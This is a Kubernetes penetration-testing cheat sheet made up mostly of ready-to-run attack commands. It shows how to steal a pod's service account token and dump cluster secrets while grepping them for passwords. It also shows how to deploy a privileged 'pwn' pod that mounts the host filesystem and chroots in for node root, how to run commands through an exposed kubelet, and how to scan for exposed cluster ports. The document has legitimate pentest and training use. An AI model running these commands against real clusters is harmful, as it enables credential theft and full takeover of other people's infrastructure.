# Kubernetes Security

Kubernetes (K8s) orchestrates containers at scale. RBAC mistakes and exposed APIs are the fastest paths to cluster compromise.

## Attack surface

- **kube-apiserver** exposed to internet
- Overly permissive **RBAC** (any pod can list secrets cluster-wide)
- **Dashboard** without auth or with weak creds
- **etcd** backups accessible
- Secrets mounted as env vars in pod specs

## Enumeration from a compromised pod

```bash
# The service account token is auto-mounted here
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# What can this token do?
kubectl --token=$TOKEN auth can-i --list
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# The prize: cluster secrets
kubectl --token=$TOKEN get secrets -A
kubectl --token=$TOKEN get secrets -o json | grep -i password

# List pods / find more targets
kubectl --token=$TOKEN get pods -A -o wide
```

## Common privilege-escalation / escape paths

```bash
# 1. Create a privileged pod that mounts the host FS (if RBAC allows create pods)
kubectl --token=$TOKEN apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata: { name: pwn }
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]
EOF
kubectl --token=$TOKEN exec -it pwn -- chroot /host sh   # root on the node

# 2. Kubelet API (port 10250) exposed and unauthenticated -> exec into pods
curl -sk https://NODE:10250/pods
curl -sk https://NODE:10250/run/<ns>/<pod>/<container> -d "cmd=id"

# 3. Automated escalation
# peirates  (interactive menu of K8s attacks)
```

## External scan

```bash
nmap -p 6443,10250,10255,2379 -sV target.com   # apiserver, kubelet, read-only, etcd
kube-hunter --remote target.com
```

## Tools

| Tool | Use |
|------|-----|
| [kube-hunter](https://github.com/aquasecurity/kube-hunter) | Passive/active K8s pentest |
| [kube-bench](https://github.com/aquasecurity/kube-bench) | CIS benchmark checks |
| [kubectl](https://kubernetes.io/docs/reference/kubectl/) | Cluster interaction |
| [peirates](https://github.com/inguardians/peirates) | K8s privilege escalation |

## Practice

- [Kubernetes Goat](https://madhuakula.com/kubernetes-goat/)
- [HackTheBox - Kubernetes boxes](https://www.hackthebox.com)

## Cloud overlap

- [AWS EKS checklist](https://securitycipher.com/aws-cloud-security-checklist/)
- [Prowler](Cloud/Prowler.md) - cloud + K8s misconfig scans
